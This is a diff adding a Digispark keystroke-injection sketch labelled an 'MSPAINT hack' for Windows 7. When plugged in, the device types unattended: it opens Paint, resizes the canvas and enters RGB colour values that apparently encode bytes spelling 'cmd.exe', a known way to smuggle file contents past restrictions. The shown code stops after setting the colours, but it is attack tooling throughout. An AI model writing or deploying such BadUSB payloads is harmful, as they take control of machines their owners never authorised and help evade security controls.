@@ -1,0 +1,86 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  // by overwraith
+  // PAINTHACK_WINDOWS7 BEGINS
+  // MSPAINT hack revealed by "Operator"
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("mspaint");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_E);
+  DigiKeyboard.print("6");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,75);
+  // ****FIRST COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("10");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // ****SECOND COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("13");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("10");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("13");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // ****THIRD COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("100");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("109");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("99");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // ****FOURTH COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("120");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("101");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("46");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // ****FIFTH COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("101");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // ****SIXTH COLOR****
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_H);
+  DigiKeyboard.print("EC");
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_R);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.print("0");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
